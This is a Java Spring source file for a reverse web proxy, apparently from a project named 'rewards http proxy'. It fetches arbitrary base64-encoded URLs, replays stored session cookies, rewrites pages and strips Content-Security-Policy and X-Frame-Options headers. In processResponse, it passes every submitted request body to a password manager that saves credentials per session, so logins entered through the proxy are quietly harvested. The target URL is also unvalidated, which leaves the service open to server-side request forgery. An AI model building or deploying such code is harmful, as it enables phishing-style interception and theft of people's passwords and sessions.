package de.localyhost.backend.rewardshttpproxy;

import org.jetbrains.annotations.Contract;
import org.jetbrains.annotations.NotNull;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DataBufferUtils;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.stereotype.Service;
import org.springframework.web.reactive.function.client.WebClient;
import org.springframework.web.reactive.function.client.WebClientResponseException;
import reactor.core.publisher.Mono;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Objects;
import java.util.zip.GZIPInputStream;
import java.util.zip.InflaterInputStream;

@Service
public class ProxyService {

    @Autowired
    private SessionService sessionService;

    @Autowired
    private HtmlProcessor htmlProcessor;

    @Autowired
    private PasswordManager passwordManager;

    private final WebClient webClient = WebClient.builder()
            .codecs(configurer -> {
                configurer.defaultCodecs().maxInMemorySize(16 * 1024 * 1024); // 16MB
            })
            .build();

    @SuppressWarnings("FieldCanBeLocal")
    private final String DEFAULT_URL = "https://www.google.com";

    public Mono<ResponseEntity<String>> handleProxyRequest(
            String token, String body, ServerHttpRequest request,
            ServerHttpResponse response, HttpMethod method) {

        try {
            String[] sessionData = sessionService.getOrCreateSession(request, response);
            String uuid = sessionData[0];
            String userKey = sessionData[1];

            String targetUrl = getTargetUrl(token);

            WebClient.RequestBodySpec requestSpec = webClient
                    .method(method)
                    .uri(targetUrl);

            requestSpec.headers(headers -> copyRequestHeaders(request, headers, uuid));

            if (body != null && !body.isEmpty() && (method == HttpMethod.POST || method == HttpMethod.PUT || method == HttpMethod.PATCH)) {
                requestSpec.bodyValue(body);
            }
            return requestSpec
                    .exchangeToMono(clientResponse -> {
                        HttpHeaders responseHeaders = clientResponse.headers().asHttpHeaders();
                        HttpStatus statusCode = (HttpStatus) clientResponse.statusCode();

                        return clientResponse.bodyToFlux(DataBuffer.class)
                                .collectList()
                                .map(dataBuffers -> {
                                    try {
                                        // Convert DataBuffers to byte array
                                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                        for (DataBuffer buffer : dataBuffers) {
                                            byte[] bytes = new byte[buffer.readableByteCount()];
                                            buffer.read(bytes);
                                            baos.write(bytes);
                                            DataBufferUtils.release(buffer);
                                        }
                                        byte[] rawBytes = baos.toByteArray();

                                        // Decompress if needed
                                        String responseBody = decompressResponse(rawBytes, responseHeaders);

                                        return processResponse(
                                                new ResponseEntity<>(responseBody, responseHeaders, statusCode),
                                                targetUrl, request, response, uuid, userKey, body
                                        );
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                        return new ResponseEntity<>(
                                                createErrorPage("Error processing response: " + e.getMessage()),
                                                HttpStatus.INTERNAL_SERVER_ERROR
                                        );
                                    }
                                });
                    })
                    .onErrorResume(WebClientResponseException.class, ex -> {
                        String errorBody = ex.getResponseBodyAsString();
                        HttpHeaders errorHeaders = new HttpHeaders();
                        ex.getHeaders().forEach((key, values) -> {
                            if (!"content-encoding".equalsIgnoreCase(key) && !"transfer-encoding".equalsIgnoreCase(key)) {
                                errorHeaders.addAll(key, values);
                            }
                        });

                        String processedError = htmlProcessor.processResponseBody(
                                errorBody, targetUrl, getProxyBaseUrl(request)
                        );

                        return Mono.just(new ResponseEntity<>(processedError, errorHeaders, ex.getStatusCode()));
                    })
                    .onErrorReturn(new ResponseEntity<>(
                            createErrorPage("Could not reach target URL: " + targetUrl),
                            HttpStatus.BAD_GATEWAY
                    ));

        } catch (Exception e) {
            e.printStackTrace();
            return Mono.just(new ResponseEntity<>(
                    createErrorPage("Proxy Error: " + e.getMessage()),
                    HttpStatus.INTERNAL_SERVER_ERROR
            ));
        }
    }

    private String decompressResponse(byte[] rawBytes, HttpHeaders headers) {
        try {
            String contentEncoding = headers.getFirst("Content-Encoding");

            if (contentEncoding != null) {
                contentEncoding = contentEncoding.toLowerCase();

                if (contentEncoding.contains("gzip")) {
                    return decompressGzip(rawBytes);
                } else if (contentEncoding.contains("deflate")) {
                    return decompressDeflate(rawBytes);
                }
            }

            return new String(rawBytes, StandardCharsets.UTF_8);

        } catch (Exception e) {
            try {
                return new String(rawBytes, StandardCharsets.UTF_8);
            } catch (Exception e2) {
                return new String(rawBytes, StandardCharsets.ISO_8859_1);
            }
        }
    }

    private String decompressGzip(byte[] compressed) throws Exception {
        try (ByteArrayInputStream bais = new ByteArrayInputStream(compressed);
             GZIPInputStream gzis = new GZIPInputStream(bais);
             ByteArrayOutputStream baos = new ByteArrayOutputStream()) {

            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzis.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }
            return baos.toString(StandardCharsets.UTF_8);
        }
    }

    private String decompressDeflate(byte[] compressed) throws Exception {
        try (ByteArrayInputStream bais = new ByteArrayInputStream(compressed);
             InflaterInputStream iis = new InflaterInputStream(bais);
             ByteArrayOutputStream baos = new ByteArrayOutputStream()) {

            byte[] buffer = new byte[1024];
            int len;
            while ((len = iis.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }
            return baos.toString(StandardCharsets.UTF_8);
        }
    }

    private String getTargetUrl(String token) {
        if (token == null || token.trim().isEmpty()) return DEFAULT_URL;

        try {
            String decoded = new String(Base64.getDecoder().decode(token));
            if (!decoded.startsWith("http://") && !decoded.startsWith("https://")) {
                return "https://" + decoded;
            }
            return decoded;
        } catch (Exception e) {
            return DEFAULT_URL;
        }
    }

    private void copyRequestHeaders(@NotNull ServerHttpRequest request, HttpHeaders headers, String uuid) {
        HttpHeaders requestHeaders = request.getHeaders();

        requestHeaders.forEach((key, values) -> {
            if (shouldSkipHeader(key)) return;
            headers.addAll(key, values);
        });

        String cookieHeader = sessionService.getCookieHeader(uuid);
        if (cookieHeader != null && !cookieHeader.isEmpty()) {
            headers.set("Cookie", cookieHeader);
        }

        if (!headers.containsKey("User-Agent")) {
            headers.add("User-Agent",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
                            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        }

        headers.set("Accept-Encoding", "gzip, deflate");

        if (!headers.containsKey("Accept")) {
            headers.add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        }
    }

    private boolean shouldSkipHeader(@NotNull String headerName) {
        String lowerName = headerName.toLowerCase();
        return lowerName.equals("host") ||
                lowerName.equals("connection") ||
                lowerName.equals("upgrade") ||
                lowerName.equals("sec-websocket-key") ||
                lowerName.equals("sec-websocket-version") ||
                lowerName.equals("sec-websocket-extensions") ||
                lowerName.equals("sec-fetch-site") ||
                lowerName.equals("sec-fetch-mode") ||
                lowerName.equals("sec-fetch-user") ||
                lowerName.equals("sec-fetch-dest");
    }

    @Contract("_, _, _, _, _, _, _ -> new")
    private @NotNull ResponseEntity<String> processResponse(
            ResponseEntity<String> responseEntity,
            String targetUrl,
            ServerHttpRequest request,
            ServerHttpResponse response,
            String uuid,
            String userKey,
            String requestBody) {

        try {
            sessionService.handleResponseCookies(responseEntity, uuid, response);

            String originalBody = responseEntity.getBody();

            if (originalBody == null) {
                originalBody = "";
            }

            String processedBody = htmlProcessor.processResponseBody(
                    originalBody, targetUrl, getProxyBaseUrl(request)
            );

            if (requestBody != null && !requestBody.isEmpty()) {
                passwordManager.checkAndSaveCredentials(requestBody, uuid, targetUrl);
            }

            HttpHeaders responseHeaders = new HttpHeaders();
            responseEntity.getHeaders().forEach((key, values) -> {
                String lowerKey = key.toLowerCase();
                if (!lowerKey.equals("set-cookie") &&
                        !lowerKey.equals("content-encoding") &&
                        !lowerKey.equals("transfer-encoding") &&
                        !lowerKey.equals("content-security-policy") &&
                        !lowerKey.equals("x-frame-options")) {
                    responseHeaders.addAll(key, values);
                }
            });

            if (!Objects.equals(originalBody, processedBody)) {
                responseHeaders.remove("content-length");
                responseHeaders.add("content-length", String.valueOf(processedBody.getBytes(StandardCharsets.UTF_8).length));
            }

            if (processedBody.trim().toLowerCase().startsWith("<!doctype html") ||
                    processedBody.trim().toLowerCase().startsWith("<html")) {
                responseHeaders.set("Content-Type", "text/html; charset=UTF-8");
            }

            return new ResponseEntity<>(processedBody, responseHeaders, responseEntity.getStatusCode());

        } catch (Exception e) {
            e.printStackTrace();
            return new ResponseEntity<>(
                    createErrorPage("Error processing response: " + e.getMessage()),
                    HttpStatus.INTERNAL_SERVER_ERROR
            );
        }
    }

    private @NotNull String getProxyBaseUrl(@NotNull ServerHttpRequest request) {
        var uri = request.getURI();

        String scheme = uri.getScheme();
        String host = uri.getHost();
        int port = uri.getPort();

        StringBuilder baseUrl = new StringBuilder();
        baseUrl.append(scheme).append("://").append(host);

        if ((scheme.equals("http") && port != 80 && port != -1) ||
                (scheme.equals("https") && port != 443 && port != -1)) {
            baseUrl.append(":").append(port);
        }

        return baseUrl.toString();
    }

    private String createErrorPage(String message) {
        return """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Proxy Error</title>
                <meta charset="UTF-8">
                <style>
                    body { font-family: Arial, sans-serif; margin: 40px; }
                    .error { background: #f8d7da; color: #721c24; padding: 20px; border-radius: 5px; }
                    .debug { margin-top: 20px; padding: 10px; background: #f0f0f0; font-family: monospace; }
                </style>
            </head>
            <body>
                <div class="error">
                    <h2>Proxy Error</h2>
                    <p>%s</p>
                </div>
                <div class="debug">
                    <p>Try accessing a URL like: <code>/proxy/{base64-encoded-url}</code></p>
                    <p>Example: <code>/proxy/aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==</code></p>
                </div>
            </body>
            </html>
            """.formatted(message);
    }
}